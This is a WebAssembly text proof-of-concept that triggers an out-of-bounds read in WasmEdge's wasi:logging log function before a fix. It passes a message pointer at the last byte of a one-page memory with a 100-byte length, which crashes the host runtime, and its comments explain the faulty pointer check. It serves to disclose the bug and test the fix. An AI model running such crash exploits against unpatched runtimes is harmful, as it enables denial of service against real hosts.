;; Proof-of-concept: OOB read in wasi:logging/logging#log (pre-fix)
;;
;; Before the fix, Log::body called:
;;   getPointer<char*>(MsgPtr)   -- only validates 1 byte at MsgPtr
;;   string_view MsgSV(MsgBuf, MsgLen) -- constructs a view of MsgLen bytes
;;
;; When MsgPtr = 65535 and MsgLen = 100, the pointer check passes (byte 65535
;; exists in a 1-page memory), but spdlog then reads bytes [65535, 65634) --
;; 99 bytes past the Wasm linear-memory boundary -- triggering a SIGSEGV on
;; any system where the page after Wasm memory is a guard page (Linux/macOS).
;;
;; Run without the fix:  wasmedge poc_oob_log.wasm  → crash (SIGSEGV / access violation)
;; Run with the fix:     wasmedge poc_oob_log.wasm  → [error] HostFuncError   (clean)
;;
;; Compile with: wat2wasm poc_oob_log.wat -o poc_oob_log.wasm
(module
  ;; wasi:logging/logging#log (level, cxt-ptr, cxt-len, msg-ptr, msg-len) -> ()
  (import "wasi:logging/logging" "log"
    (func $log (param i32 i32 i32 i32 i32)))

  ;; One Wasm page = 65 536 bytes.  The OS places a PROT_NONE guard page
  ;; immediately after this region.
  (memory (export "memory") 1)

  ;; "stdout" at offset 0
  (data (i32.const 0) "stdout")

  (func (export "_start")
    ;; Place one byte of payload at the last valid offset (65535).
    (i32.store8 (i32.const 65535) (i32.const 65))  ;; 'A'

    ;; level=Info(2), context="stdout"[0..6], message=[65535..65535+100)
    ;; The message window crosses the page boundary by 99 bytes.
    (call $log
      (i32.const 2)     ;; level: Info
      (i32.const 0)     ;; context-ptr  ("stdout")
      (i32.const 6)     ;; context-len
      (i32.const 65535) ;; message-ptr  (last byte of page 0)
      (i32.const 100)   ;; message-len  (extends 99 bytes past the boundary)
    )
  )
)
